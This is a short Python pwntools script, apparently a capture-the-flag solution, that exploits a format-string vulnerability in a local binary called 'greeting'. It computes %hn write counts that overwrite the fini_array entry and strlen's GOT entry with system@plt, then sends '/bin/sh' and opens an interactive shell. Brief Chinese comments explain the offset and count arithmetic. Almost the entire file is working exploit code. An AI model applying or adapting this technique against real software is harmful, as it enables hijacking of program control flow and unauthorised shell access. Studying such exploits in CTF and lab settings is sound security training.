#!/usr/bin/python
#coding:utf-8

from pwn import *

io = process("./greeting")
context.update(arch = 'i386', os = 'linux')

fini_array = 0x08049934	#内容是__do_global_dtors_aux 0x080485a0
start = 0x080484f0		#		
strlen_got = 0x08049a54
system_plt = 0x08048490

payload = 'aa'    #填充，使得偏移量从12.5至13
payload += p32(fini_array) #不需要修改fini_array+2，因为已经是0804了
payload += p32(strlen_got+2) 
payload += p32(strlen_got) 
payload += '%34000c%12$hn'  #0x84f0-0x20=0x84D0=34000
payload += '%33556c%13$hn'  #0x10804-0x84f0=0x8314=33556
payload += '%31884c%14$hn'  #0x18490-0x10804=0x7c8c=31884

io.sendline(payload)
io.sendline('/bin/sh\x00')
io.interactive()
